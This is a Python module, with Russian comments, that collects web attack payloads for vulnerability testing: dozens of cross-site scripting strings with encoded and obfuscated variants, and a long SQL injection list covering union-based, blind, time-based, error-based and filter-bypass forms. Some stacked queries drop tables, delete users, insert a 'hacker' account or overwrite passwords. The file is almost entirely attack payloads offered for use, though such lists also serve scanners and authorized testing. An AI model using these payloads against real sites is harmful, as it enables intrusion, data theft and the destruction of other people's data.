"""
XSS Payload коллекция для тестирования уязвимостей
Используется только в образовательных целях на собственных ресурсах
"""

XSS_PAYLOADS = [
    # Базовые XSS payloads
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '" onmouseover="alert(1)"',
    "' onmouseover='alert(1)'",
    
    # HTML события
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<video src=x onerror=alert(1)>',
    '<audio src=x onerror=alert(1)>',
    '<iframe onload=alert(1)>',
    '<object data=x onerror=alert(1)>',
    '<embed src=x onerror=alert(1)>',
    
    # Data URI XSS
    '<a href="javascript:alert(1)">click</a>',
    '<a href="vbscript:alert(1)">click</a>',
    
    # SVG XSS
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributeName=x to=1>',
    
    # Закодированные варианты
    '<img src=x &#x6F;&#x6E;&#x65;&#x72;&#x72;&#x6F;&#x72;&#x3D;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>',
    '<img src=x &#101;&#114;&#114;&#111;&#114;&#61;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',
    
    # Форматы с пробелами и табуляциями
    '<script    >alert(1)</script>',
    '<img    src=x    onerror=alert(1)>',
    '<svg\nonload=alert(1)>',
    
    # Протокол javascript
    'javascript:alert(1)',
    'JAVASCRIPT:alert(1)',
    'jAvAsCrIpT:alert(1)',
    
    # Комбинированные
    '<img src=x onerror="alert(\'XSS\')">',
    '<img src=x onerror=\'alert("XSS")\'>',
    '<svg><img src=x onerror=alert(1)></svg>',
    
    # Event handler обфускация
    '<img src=x on&#x65;rror=alert(1)>',
    '<img src=x &#111;nerror=alert(1)>',
    
    # Form payload
    '<form action=javascript:alert(1)><input type=submit>',
    
    # Meta refresh
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    
    # Style с выражениями
    '<style>body{background:url("javascript:alert(1)")}</style>',
    
    # Base64 кодированные
    '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+">',
    
    # Unicode escape
    '<img src=x \\u006f\\u006e\\u0065\\u0072\\u0072\\u006f\\u0072=alert(1)>',
    
    # Null byte injection
    '<img src=x onerror=alert(1)%00.jpg>',
    
    # Case variation
    '<IMG SRC=x OnErRoR=alert(1)>',
    '<Img Src=x OnError=alert(1)>',
    
    # Множественные события
    '<img src=x onerror=alert(1) onload=alert(2)>',
    
    # Аттрибут с кавычками и без
    '<img src=x onerror=alert(1)>',
    '<img src="x" onerror="alert(1)">',
    '<img src=\'x\' onerror=\'alert(1)\'>',
    
    # Тег button
    '<button onclick=alert(1)>Click</button>',
    '<button onfocus=alert(1) autofocus>',
    
    # Label и другие интерактивные элементы
    '<label onclick=alert(1)>Click</label>',
    '<div onclick=alert(1)>Click</div>',
    '<span onclick=alert(1)>Click</span>',
    
    # Закрытие тега и переполнение аттрибута
    '<img src=x onerror=alert(1)" ">',
    '<img src=x onerror=alert(1)\' \'>',
    
    # XML Entity
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "javascript:alert(1)">]><foo>&xxe;</foo>',
    
    # Math и other tags
    '<math><mi xlink:href="javascript:alert(1)">X</mi></math>',
    
    # Polyglot XSS
    '"><svg onload=alert(1)>',
    '\';alert(1);//',
    '\");alert(1);//',
    
    # Специальные браузер-специфичные
    '<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000"><param name="allowNetworking" value="all"/><param name="allowScriptAccess" value="always"/><param name="movie" value="javascript:alert(1)"/></object>',
    
    # Uncommon tags
    '<track onload=alert(1)>',
    '<source onerror=alert(1)>',
    '<portal onload=alert(1)>',
]


# Дополнительные группы payload-ов для специфичных проверок

SQL_INJECTION_PAYLOADS = [
    # Базовые SQL инъекции
    "'",
    "' OR '1'='1",
    "' UNION SELECT NULL--",
    "' AND 1=1--",
    "' OR 1=1--",
    "1' UNION SELECT NULL,NULL,NULL--",
    "admin' --",
    "' OR 'x'='x",
    "' UNION ALL SELECT NULL--",
    "1'; DROP TABLE users--",
    
    # Boolean-based blind SQLi
    "' AND '1'='1",
    "' AND '1'='2",
    "' AND 1=1 AND 'a'='a",
    "' AND 1=2 AND 'a'='a",
    "1' AND 1=1--",
    "1' AND 1=2--",
    
    # Time-based blind SQLi
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5); --",
    "' AND SLEEP(5)--",
    "' OR SLEEP(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "'; BENCHMARK(5000000, UPPER('test')); --",
    
    # Union-based SQLi
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL--",
    "' UNION SELECT NULL, NULL, NULL, NULL--",
    "' UNION ALL SELECT version()--",
    "' UNION SELECT user()--",
    "' UNION SELECT database()--",
    "' UNION SELECT @@version--",
    
    # Stacked queries
    "'; DROP TABLE users; --",
    "'; DELETE FROM users; --",
    "'; INSERT INTO users VALUES ('hacker', 'password'); --",
    "'; UPDATE users SET password='hacked'; --",
    
    # MySQL специфичные
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "' OR 1=1; %23",
    "' UNION SELECT @@version, user() --",
    "' UNION SELECT table_name FROM information_schema.tables --",
    "' UNION SELECT column_name FROM information_schema.columns --",
    
    # PostgreSQL специфичные
    "'; SELECT version(); --",
    "' UNION SELECT current_database(); --",
    "' UNION SELECT user; --",
    "' UNION SELECT * FROM pg_user; --",
    "' UNION SELECT table_name FROM information_schema.tables; --",
    
    # MSSQL специфичные
    "' EXEC sp_tables --",
    "' EXEC sp_columns @table_name='users' --",
    "' UNION SELECT @@version --",
    "' UNION SELECT DB_NAME() --",
    "' UNION SELECT CURRENT_USER --",
    
    # Oracle специфичные
    "' UNION SELECT * FROM user_tables --",
    "' UNION SELECT * FROM user_tab_columns --",
    "' UNION SELECT banner FROM v$version --",
    "' UNION SELECT username FROM all_users --",
    
    # Error-based SQLi
    "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--",
    "' AND updatexml(1, concat(0x7e, (SELECT @@version)), 1)--",
    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(@@version, FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    
    # Второй порядок (Second-order)
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "admin'--",
    "admin' /*",
    "admin' #",
    
    # Логические манипуляции
    "' OR '' = '",
    "' OR 1 = 1 OR '1' = '1",
    "' OR a=a --",
    "' OR a=a #",
    "' OR a=a /*",
    
    # Обход фильтров
    "' /*!50000OR*/ '1'='1",  # MySQL версионный комментарий
    "' %4F%52 '1'='1",        # OR закодирован
    "' %51%4E%49%4F%4E %53%45%4C%45%43%54",  # UNION SELECT закодирован
    
    # Нулевые байты и кодирование
    "' %00",
    "' %23",  # #
    "' %2D%2D",  # --
    
    # Конкатенация и обход
    "' un/**/ion select null--",
    "' u/**/nion u/**/nion select null--",
    "' /*!50000union*/ select null--",
    
    # Различные комментарии
    "' -- -",
    "' # ",
    "' /*",
    "' /*! */",
    "' /*!40000 */",
    
    # Escape-последовательности
    "' \\' OR '1'='1",
    "' ' OR ' '1' = '1",
    "' ESCAPE '\\' OR '1'='1",
    
    # Null байты
    "' %00 OR '1'='1",
    "' \x00 OR '1'='1",
    
    # Побег из строк
    "\") OR (\"1\"=\"1",
    "') OR ('1'='1",
    "\") OR (\"\" = \"",
    
    # Множественные условия
    "' AND 1=1 UNION SELECT null--",
    "' OR 1=1 AND 'a'='a",
    "' AND (1=1 OR 1=1) --",
    
    # Инъекции в числовые поля
    "1 OR 1=1",
    "1; DROP TABLE users; --",
    "-1 UNION SELECT NULL--",
    "999999 UNION SELECT null--",
    
    # Проверка версий базы данных
    "' AND SUBSTRING(@@version, 1, 1) = '5'--",
    "' AND ASCII(SUBSTRING(@@version, 1, 1)) > 48--",
    
    # Проверка существования таблиц
    "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users') = 1--",
    "' AND EXISTS(SELECT * FROM users)--",
]


def get_xss_payloads():
    """Возвращает список XSS payload-ов"""
    return XSS_PAYLOADS


def get_sql_payloads():
    """Возвращает список SQL injection payload-ов"""
    return SQL_INJECTION_PAYLOADS


def get_xss_payloads_count():
    """Возвращает количество XSS payload-ов"""
    return len(XSS_PAYLOADS)


def get_sql_payloads_count():
    """Возвращает количество SQL payload-ов"""
    return len(SQL_INJECTION_PAYLOADS)
